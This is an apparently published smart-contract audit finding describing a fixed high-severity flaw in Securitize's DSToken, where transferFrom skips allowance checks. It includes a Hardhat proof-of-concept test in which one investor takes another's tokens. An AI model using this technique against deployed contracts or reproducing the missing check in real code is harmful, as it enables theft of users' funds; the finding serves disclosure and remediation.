---
tags:
  - lang/solidity
  - sector/bridge
  - sector/token
  - platform/cyfrin
  - has/github
  - has/poc
  - severity/high
  - impact/loss-of-funds/direct-drain
  - precondition/specific-token-type
protocol: "[[Securitize]]"
auditors:
  - "[[Stalin]]"
report: "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-10-10-cyfrin-securitize-dstoken-rebasing-v2.1.md"
genome:
  - "[[missing-check]]"
  - "[[direct-drain]]"
  - "[[specific-token-type]]"
  - "[[bridge-message-validation]]"
---
# Investors can steal tokens from other investors since `StandardToken::transferFrom` never checks spending approvals

- id: 64373
- impact: HIGH
- protocol: [[Securitize]] Dstoken Rebasing
- reporter: Stalin (Cyfrin)
- source: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-10-10-cyfrin-securitize-dstoken-rebasing-v2.1.md

## Summary



The report describes a bug in the DSToken smart contract, which allows investors to steal tokens from other investors. This is because the `StandardToken::transferFrom` function does not check for spending approvals. A proof of concept has been provided in the `test/dstoken-regulated.test.ts` file, which shows how this vulnerability can be exploited. The recommended mitigation is to enforce spending approvals in the `StandardToken::transferFrom` function. The bug has been fixed in the `aefb895` commit by Securitize and has been verified by Cyfrin.

## Details

**Description:** Investors can steal tokens from other investors since `StandardToken::transferFrom` never checks spending approvals.

**Proof of Concept:** Add PoC to `test/dstoken-regulated.test.ts`:
```javascript
  describe('TransferFrom', function () {
    it('Investors can steal tokens from other investors', async function () {
      // setup 2 investors
      const [investor, investor2] = await hre.ethers.getSigners();
      const { dsToken, registryService, rebasingProvider } = await loadFixture(deployDSTokenRegulated);
      await registerInvestor(INVESTORS.INVESTOR_ID.INVESTOR_ID_1, investor, registryService);
      await registerInvestor(INVESTORS.INVESTOR_ID.INVESTOR_ID_2, investor2, registryService);

      // give first investor some tokens
      await dsToken.issueTokens(investor, 500);

      const valueToTransfer = 100;
      const shares = await rebasingProvider.convertTokensToShares(valueToTransfer);
      const multiplier = await rebasingProvider.multiplier();

      // connect as second investor
      const dsTokenFromInvestor = await dsToken.connect(investor2);

      // use `transferFrom` to steal tokens from first investor, even though
      // first investor never approved second investor as a spender
      await expect(dsTokenFromInvestor.transferFrom(investor, investor2, valueToTransfer))
        .to.emit(dsToken, 'TxShares')
        .withArgs(investor.address, investor2.address, shares, multiplier);
    });
  });
```

Run with: `npx hardhat test --grep "Investors can steal tokens from other investors"`.

**Recommended Mitigation:** `StandardToken::transferFrom` must enforce spending approvals.

**Securitize:** Fixed in commit [aefb895](https://github.com/securitize-io/dstoken/commit/aefb895e520d93ef0a8278ce3a7e88b2808478f5).

**Cyfrin:** Verified.

\clearpage
